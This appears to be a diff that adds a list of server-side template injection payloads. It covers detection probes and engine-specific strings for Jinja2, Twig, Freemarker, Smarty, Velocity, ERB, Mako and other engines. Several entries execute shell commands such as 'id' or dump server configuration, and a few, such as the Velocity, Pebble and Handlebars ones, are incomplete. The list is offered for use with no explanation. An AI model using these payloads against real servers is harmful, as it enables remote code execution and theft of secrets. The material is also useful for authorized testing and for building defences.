@@ -1,0 +1,57 @@
+# Server-Side Template Injection Payloads
+
+# Detection
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+@(7*7)
+${{7*7}}
+#{{7*7}}
+{{7*'7'}}
+
+# Jinja2 (Python)
+{{config}}
+{{self}}
+{{self.__class__.__mro__}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{config.items()}}
+{{request.environ}}
+
+# Twig (PHP)
+{{_self.env.registerUndefinedFilterCallback("system")}}
+{{_self.env.getFilter("id")}}
+
+# Freemarker (Java)
+${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+# Smarty (PHP)
+{php}echo `id`;{/php}
+{system('id')}
+
+# Velocity (Java)
+#set($x='')##
+$x.class.forName('java.lang.Runtime').getRuntime()
+
+# Pebble (Java)
+{% set cmd = 'id' %}
+
+# Thymeleaf (Java)
+${T(java.lang.Runtime).getRuntime()}
+
+# ERB (Ruby)
+<%= 7*7 %>
+<%= system('id') %>
+
+# Mako (Python)
+${7*7}
+<% import os %>${os.popen('id').read()}
+
+# Handlebars (JS)
+{{#with "s" as |string|}}
+{{/with}}
+
+# Polyglot
+${{<%[%'"}}%\.
